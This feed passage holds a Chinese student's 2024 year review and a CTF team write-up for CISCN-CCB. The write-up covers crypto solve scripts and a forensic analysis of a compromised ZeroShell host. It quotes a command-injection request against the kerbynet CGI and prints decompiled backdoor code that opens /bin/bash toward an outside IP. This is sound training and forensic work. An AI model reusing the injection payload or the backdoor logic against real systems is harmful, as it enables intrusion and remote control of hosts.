    <content type="html"><![CDATA[<h1 id="2024年度总结"><a class="markdownIt-Anchor" href="#2024年度总结"></a> 2024年度总结</h1><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>2024也很快就过去了，今年大部分事也都做完了，就趁今天生日，做一下总结吧。</p><h2 id="ctf总结"><a class="markdownIt-Anchor" href="#ctf总结"></a> CTF总结</h2><p>上半年说过的这里就不说了。</p><p>我觉得最重要的就是进了一次线下吧，没想到27（进20）名都能进闽盾杯线下，当时在现场居然看到了有70多名的都进了线下。原来大佬都已经看不上这种比赛了。</p><p>在线下靠队友蹭了个三等奖。（密码手线下就是去旅游哒）</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/imgs/2024final/2.png" alt="" /></div><div class="group-image-wrap"><img src="/imgs/2024final/3.jpg" alt="" /></div><div class="group-image-wrap"><img src="/imgs/2024final/4.png" alt="" /></div></div></div><p>之后在NSS-3rd的时候凭运气拿到了第一份贴纸。（好看耶）</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/imgs/2024final/5.png" alt="" /></div><div class="group-image-wrap"><img src="/imgs/2024final/6.png" alt="" /></div></div></div><p>噢对了，还有参与了BaseCTF出题，尽自己最大的努力出题了，也算经历了一段难忘的比赛。（之后就直接萎了，出题真难吧</p><p><img src="/imgs/2024final/7.png" alt="" /></p><p>在之后就开始忙毕设的事情了，CTF也是有比赛就看看题</p><p>然后打了一个省赛mini，初赛可联网可AI理论，决赛CTF，也是运气好拿了个第三，二等奖</p><p><img src="/imgs/2024final/8.jpg" alt="" /></p><p>之后就一直到了ciscn-ccb了吧，秉持着国赛了就认真一点的态度，拉着队友来认真坐牢，最后除了两题密码原题，其他的都是取证拿的分，队友的取证太强啦，结束之后赛区也是进了前100，不知道能不能进半决赛跟师傅们面基呢，可能也是此身仅有的机会了。</p><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><p>现在也是22岁了，这一年发生了好多好多事。</p><p>首先身体健康有点下降，锻炼次数变少了，现在半马也跑不了了（鉴定为打CTF打的）。现在时间充裕了，也是恢复锻炼了，说到底还是身体最重要，希望各位师傅们不要emo了噢。对了，今天晚上出去跑步，看到了非常漂亮的夜色海景，跑步的疲惫感一下子就没了，如果师傅们累了，可以放下手头的事情出去散散心噢。</p><p>不过精神健康今年改善了很多。年初的时候尝试了一次面试，发现自己真的什么都不会，什么都没有准备就去被拷打了，简历什么都没有，就像上了战场发现没有兵器一样，之后直接迷茫了，想着逃避，结果就想着之前接触过一点的CTF，感觉蛮好玩的，就来深入了，也算是做的最对的一个决定了吧。我个人认为，CTF可以很好的帮助新手入门计算机，入门安全，不仅能锻炼快速学习能力，也可以有很多方向的选择，还有那么多师傅肯帮忙，当然如今CTF大环境我就不说了。给自己找了事情做之后，脑子就什么都不会想了，什么emo、焦虑啥的，都飞走啦。</p><p>大学也仅剩最后半年了，希望之后一切顺利吧。</p>]]></content>
    
    
    <categories>
      
      <category>me</category>
      
    </categories>
    
    
    <tags>
      
      <tag>me</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN-CCB-BY-YR</title>
    <link href="/2024/12/15/ciscnccb/"/>
    <url>/2024/12/15/ciscnccb/</url>
    
    <content type="html"><![CDATA[<h1 id="yr战队-writeup"><a class="markdownIt-Anchor" href="#yr战队-writeup"></a> YR战队 WRITEUP</h1><h2 id="一-战队信息"><a class="markdownIt-Anchor" href="#一-战队信息"></a> 一、战队信息</h2><p>战队名称：YR</p><p>战队排名：492</p><h2 id="二-解题情况"><a class="markdownIt-Anchor" href="#二-解题情况"></a> 二、解题情况</h2><p><img src="/imgs/CISCNCCB2025/1.png" alt="" /></p><h2 id="三-解题过程"><a class="markdownIt-Anchor" href="#三-解题过程"></a> 三、解题过程</h2><h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h3><h4 id="fffffhash"><a class="markdownIt-Anchor" href="#fffffhash"></a> fffffhash</h4><p>通过输出关键的参数x=309485009821345068724781371，</p><p>搜索309485009821345068724781371知道是FNV-128bit</p><p>查到利用LLL的类似的wp:<a href="https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/fnv/solve/solution_joseph_LLL.sage">https://github.com/DownUnderCTF/Challenges_2023_Public/blob/main/crypto/fnv/solve/solution_joseph_LLL.sage</a></p><p>直接照着题目代码修改参数</p><p>通过调试得到n的大小</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python">TARGET = <span class="hljs-number">201431453607244229943761366749810895688</span><br>h0 = <span class="hljs-number">0x6c62272e07bb014262b821756295c58d</span><br>p = <span class="hljs-number">0x0000000001000000000000000000013b</span><br>MOD = <span class="hljs-number">2</span>**<span class="hljs-number">128</span><br><br>n = <span class="hljs-number">16</span><br>M = Matrix.column([p^(n - i - <span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n)] + [-(TARGET - h0*p^n), MOD])<br>M = M.augment(identity_matrix(n+<span class="hljs-number">1</span>).stack(vector([<span class="hljs-number">0</span>] * (n+<span class="hljs-number">1</span>))))<br>Q = Matrix.diagonal([<span class="hljs-number">2</span>^<span class="hljs-number">128</span>] + [<span class="hljs-number">2</span>^<span class="hljs-number">4</span>] * n + [<span class="hljs-number">2</span>^<span class="hljs-number">8</span>])<br>M *= Q<br>M = M.BKZ()<br>M /= Q<br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> M:<br>    <span class="hljs-keyword">if</span> r[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(r[-<span class="hljs-number">1</span>]) == <span class="hljs-number">1</span>:<br>        r *= r[-<span class="hljs-number">1</span>]<br>        good = r[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(good)<br>        <span class="hljs-keyword">break</span><br>inp = []<br>y = <span class="hljs-built_in">int</span>(h0*p)<br>t = (h0*p^n + good[<span class="hljs-number">0</span>] * p^(n-<span class="hljs-number">1</span>)) % MOD<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        y_ = (<span class="hljs-built_in">int</span>(y) ^^ <span class="hljs-built_in">int</span>(x)) * p^(n-i-<span class="hljs-number">1</span>) % MOD<br>        <span class="hljs-keyword">if</span> y_ == t:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;good&#x27;</span>, i, x)<br>            inp.append(x)<br>            <span class="hljs-keyword">if</span> i &lt; n-<span class="hljs-number">1</span>:<br>                t = (t + good[i+<span class="hljs-number">1</span>] * p^(n-i-<span class="hljs-number">2</span>)) % MOD<br>                y = ((<span class="hljs-built_in">int</span>(y) ^^ <span class="hljs-built_in">int</span>(x)) * p) % MOD<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bad&#x27;</span>, i)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(inp).<span class="hljs-built_in">hex</span>())<br>// 020101081b04390001051a020a3d0f0f<br></code></pre></td></tr></table></figure><p><img src="/imgs/CISCNCCB2025/fffffrand/1.png" alt="" /></p><h4 id="rasnd"><a class="markdownIt-Anchor" href="#rasnd"></a> rasnd</h4><p>手动连接得到参数</p><p>part1:</p><p>先处理hint1和hint2</p><p>爆破较小的x，hint2*x1，hint1*x2，相减再与n1进行GCD就可以得到q</p><p>得到q直接解密就行了</p><p>part2:</p><p>参考：</p><p><a href="https://blog.csdn.net/luochen2436/article/details/129181271">https://blog.csdn.net/luochen2436/article/details/129181271</a></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><msub><mi>t</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><mrow><mi>n</mi><mo>−</mo><mi>p</mi><mo>−</mo><mi>q</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mo>=</mo><msup><mi>m</mi><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mo>=</mo><msup><mi>m</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><mi>h</mi><mi>i</mi><mi>n</mi><msubsup><mi>t</mi><mn>2</mn><mrow><mo>−</mo><mn>1</mn></mrow></msubsup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi><mspace linebreak="newline"></mspace></mrow><annotation encoding="application/x-tex">hint_2=m^{n-p-q}\mod q=m^{\phi(n)-1}\mod q=m^{-1}\mod q\\m=hint_2^{-1}\mod q\\</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.821331em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.821331em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">p</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.938em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1205469999999997em;vertical-align:-0.256439em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4435610000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.256439em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span></span></span></span></p><p>得到514*p-114*q，直接跟n=p*q联立方程就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span>  *<br><br>n1=<span class="hljs-number">11253456301404072182754603079043141230357632788687128065946949158421386019810331746559589520167575285461013231695562260288474435323651486728462182455684783621146533735439516661083154202402094564409797610965484750133738948093654463980274589206533544745239593323687597158332853322688834333877527879648033739944377991072365645287974409264751053149810266318150358528958695995448206102977234465894707576713203411728480923368608079227663155141454053171021621895561229310948351858551966089589810458449489930569488309784787298671538269292547138600936732070803719330443830023896360524647242544758858550421544632830525000969021</span><br>c1=<span class="hljs-number">8499679502416909357939986454449383217929657276328884744252110300118585376760998970256899096933625143878216424502943862848223333991791355858607867618745163957692936089698174344113246726053590682306119213994882195821855969008568291868812781815357921466464892371352951440648343250861078226735739317822382957147244865046380055135366135267450129149663761447216572527854715442366920877558145509864933807963361779253891209769139019896894284962745494007050260900203902288375243100699726367780684955023612441356974739956402745147033094774686164403598983705486096400509860060256662636611892179313959468258085801623281908958306</span><br>hint11=<span class="hljs-number">17676209393363873836616956378006241932018678956800177404559670972320106080186175872019330254680063146159633352040419753333739877504801655707461743996360860074533886246883000834602444450563478802498391744461000891946602955271019377331422970647454283295639907116545974746002247519488100359581041415620977668314102564371271101341417292169569751</span><br>hint12=<span class="hljs-number">892164632137965257404704659317620180133919820054497710194577219436051826293520132465478378901898630232069660620200822495415347206456545002722997494118196531269124510503871707983543682617650707774098790755476191393584818990189315815327863744625319881016693821820062695832323709521864841849420105119520142732380645163928515949248627003405815102096473638849801662204513485212456415643028454337266359464009419892900199392235981999590510829354486285848071251803213507</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-number">0</span>:<br>    hint11=hint11+<span class="hljs-number">0x114</span><br>    hint12=hint12+<span class="hljs-number">0x514</span><br>    <span class="hljs-keyword">for</span> x1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">11</span>+<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> x2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">11</span>+<span class="hljs-number">1</span>):<br>            q=<span class="hljs-built_in">int</span>(gcd(hint12*x1-hint11*x2,n1))<br>            <span class="hljs-keyword">if</span> q.bit_length()==<span class="hljs-number">1024</span> <span class="hljs-keyword">and</span> isPrime(q):<br>                flag1=long_to_bytes(<span class="hljs-built_in">pow</span>(c1,inverse(<span class="hljs-number">65537</span>,q-<span class="hljs-number">1</span>),q))<br>                <span class="hljs-built_in">print</span>(flag1)<br>                exit()<br><span class="hljs-comment">#b&#x27;flag&#123;5f97682d-e7bf-&#x27;           </span><br><br><span class="hljs-comment">#https://blog.csdn.net/luochen2436/article/details/129181271</span><br>n2=<span class="hljs-number">14217913464459559682250875501886201276876328130146621058904052452278231545562301222073675283834120195896879261204877956594249270008118834684665611333775785540398977821573478806703825815281652967784898299930527726439037749019760799845047679385220189738630913625419692052778253277286212296445004302620626988533627355677869101844377851844299099905220669618825288695316487157845779020847788016128286053705169807753579824931407426513605070820324686135268717340101082088189807681669714476855421572848587697256393664762171900144896459413927294243594831765921498135651902566596193419698276450417081358963095530327916716815471</span><br>c2=<span class="hljs-number">10813198470406533857220297365144817764494546388124020326246100807725599407936858418372461604440989526434764769646474529144698553404454498330299339001268266442190881046798013800230695418512588589548559815286659383606192081671939800961491163261471780789234548933509984782326050156749252109417469372350353839078435276939895993315409326959545136004479234394204733463770802144577959343353853931551396004269664808998993218026499223645426011418112367165355608052943350106781733459127034314624179963889512767512695687925177031381133173284545775059709716565412326201630506864491038183759653328168822467109694920688415836066824</span><br>s=<span class="hljs-number">8622138450599474319575025668181890197317138615118712483697608983729406165889177728238980145474189791200674222799428164855362343438877601351502481230300737810189886212903644248984679582387466437485042409474427772423432264350891006157655032700171141741601071796907799334832768249378115672861466623851728568869966008957739548946015354053401528336142451508118071266077071413659041952533227860880436238236471883889518976004280218746662796058207527002850084337608848782124623974707511360966275169272055067156929736605139147390769499862668667648054224585342241937444069239228396295614125346897679304557597611584898082698898</span><br>m1 = gmpy2.invert(s,n2)<br>p,q = symbols(<span class="hljs-string">&#x27;p q&#x27;</span>)<br>eq = [p*q-n2,<span class="hljs-number">514</span>*p - <span class="hljs-number">114</span>*q-m1]<br>result = nonlinsolve(eq,[p,q])<br>result = <span class="hljs-built_in">list</span>(result)<br>p,q = <span class="hljs-built_in">int</span>(result[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(result[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>])<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(<span class="hljs-number">65537</span>,phi)<br>flag2 = <span class="hljs-built_in">pow</span>(c2,d,n2)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(flag2))<br><span class="hljs-comment">#b&#x27;43ea-ac35-0a842bc974c1&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="威胁流量"><a class="markdownIt-Anchor" href="#威胁流量"></a> 威胁流量</h3><h4 id="zeroshell"><a class="markdownIt-Anchor" href="#zeroshell"></a> zeroshell</h4><h5 id="zeroshell-1"><a class="markdownIt-Anchor" href="#zeroshell-1"></a> zeroshell-1</h5><p>吐了 翻了一大圈，结果发现在Referer里，因为别的地方真的没东西了</p><p>GET /cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=‘%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20–checkpoint=1%20–checkpoint-action=exec=‘ps%20-ef’%0A’ HTTP/1.1 Host: 61.139.2.100 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept-Encoding: gzip, deflate Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8 Connection: close Accept-Language: en-US,en;q=0.5 Referer: ZmxhZ3s2QzJFMzhEQS1EOEU0LThEODQtNEE0Ri1FMkFCRDA3QTFGM0F9 Upgrade-Insecure-Requests: 1</p><p>flag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}</p><h5 id="zeroshell-2"><a class="markdownIt-Anchor" href="#zeroshell-2"></a> zeroshell-2</h5><p>直接挂载硬盘，文件位于/dev/sdb4中，即第四逻辑分区</p><p>root@debianTemplate12:/mnt/sdb/sdb4/_DB.001# cat flag</p><p>c6045425-6e6e-41d0-be09-95682a4f65c4</p><p>即可得到</p><h5 id="zeroshell-3"><a class="markdownIt-Anchor" href="#zeroshell-3"></a> zeroshell-3</h5><p>通过Wireshark抓包发现，总是在连接这个ip地址</p><p>Internet Protocol Version 4, Src: 61.139.2.100, Dst: 202.115.89.103</p><h5 id="zeroshell-4"><a class="markdownIt-Anchor" href="#zeroshell-4"></a> zeroshell-4</h5><p>netstat -anp |grep 103 多次尝试发现有时候会有一个 bash</p><p><img src="/imgs/CISCNCCB2025/zeroshell/1.png" alt="" /></p><p>ps -aux发现时不时有个</p><p>/bin/bash 1120 32</p><p>ps -feww 发现它ppid是1</p><p>PPID 1</p><p>ps -ppid 1 发现这个.nginx会周期执行，并且执行很多后，连接木马频率明显变快</p><p><img src="/imgs/CISCNCCB2025/zeroshell/2.png" alt="" /></p><p>最终得到的木马文件</p><p>flag{.nginx}</p><h5 id="zeroshell-5"><a class="markdownIt-Anchor" href="#zeroshell-5"></a> zeroshell-5</h5><p>看string窗口，找到一个比较像密钥的字符串</p><p><img src="/imgs/CISCNCCB2025/zeroshell/3.png" alt="" /></p><p>定位字符串，发现这个函数里有/bin/bash  , 以及通信地址，那么11223344qweasdzxc大概率就是加密密钥了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *)*a2, <span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>  v2 = sub_8063EB0();<br>  <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( !v2 )<br>  &#123;<br>    v4 = sub_8064310(<span class="hljs-number">0</span>);<br>    v3 = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> ( v4 &gt;= <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != <span class="hljs-number">1024</span>; ++i )<br>        sub_80645D0(i);<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">do</span><br>          &#123;<br>            <span class="hljs-keyword">do</span><br>            &#123;<br>              sub_8063C10(<span class="hljs-number">30</span>);<br>              v6 = sub_80682F0(<span class="hljs-number">2</span>);<br>            &#125;<br>            <span class="hljs-keyword">while</span> ( v6 &lt; <span class="hljs-number">0</span> );<br>            v7 = sub_8068AD0(<span class="hljs-string">&quot;202.115.89.103&quot;</span>);<br>          &#125;<br>          <span class="hljs-keyword">while</span> ( !v7 );<br>          sub_8057DE0(&amp;v12, **(_DWORD **)(v7 + <span class="hljs-number">16</span>), *(_DWORD *)(v7 + <span class="hljs-number">12</span>));<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)sub_8068170(v6) &gt;= <span class="hljs-number">0</span> )<br>          &#123;<br>            v8 = sub_8063EB0();<br>            <span class="hljs-keyword">if</span> ( v8 &gt;= <span class="hljs-number">0</span> )<br>              <span class="hljs-keyword">break</span>;<br>          &#125;<br>          sub_80645D0(v6);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( !v8 )<br>          <span class="hljs-keyword">break</span>;<br>        sub_8063B80(v8, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        sub_80645D0(v6);<br>      &#125;<br>      v9 = sub_8063EB0();<br>      v3 = <span class="hljs-number">8</span>;<br>      <span class="hljs-keyword">if</span> ( v9 &gt;= <span class="hljs-number">0</span> )<br>      &#123;<br>        LOBYTE(v3) = <span class="hljs-number">9</span>;<br>        <span class="hljs-keyword">if</span> ( !v9 )<br>        &#123;<br>          sub_8063BF0(<span class="hljs-number">3</span>);<br>          <span class="hljs-keyword">if</span> ( sub_8049C93(v6, (<span class="hljs-type">int</span>)::a2) == <span class="hljs-number">1</span> )<br>            <span class="hljs-comment">// 11223344qweasdzxc</span><br></code></pre></td></tr></table></figure><h5 id="zeroshell-6"><a class="markdownIt-Anchor" href="#zeroshell-6"></a> zeroshell-6</h5><p><img src="/imgs/CISCNCCB2025/zeroshell/4.png" alt="" /></p><p>把.nginx文件换成cat，卡在了加载脚本，说明文件一个就是在这些脚本里</p><p><img src="/imgs/CISCNCCB2025/zeroshell/5.png" alt="" /></p><p><img src="/imgs/CISCNCCB2025/zeroshell/6.png" alt="" /></p><p>这说明确实在这</p><p>那我们找一下这个脚本放哪的</p><p><img src="/imgs/CISCNCCB2025/zeroshell/7.png" alt="" /></p><p>拿find搜索nat 最后看到/var/register/system/startup/scripts/nat/File</p><h4 